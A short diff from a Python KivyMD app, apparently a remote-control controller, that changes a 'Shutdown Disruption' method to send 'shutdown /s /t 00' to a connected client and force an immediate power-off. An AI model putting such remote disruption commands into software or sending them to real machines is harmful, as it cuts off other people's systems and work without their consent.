@@ -231,7 +231,7 @@ class Main(MDApp):
     #Shutdown Disruption
     def Shutdown(self):
         while True:
-            command = 'shutdown /s'
+            command = 'shutdown /s /t 00'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
             break
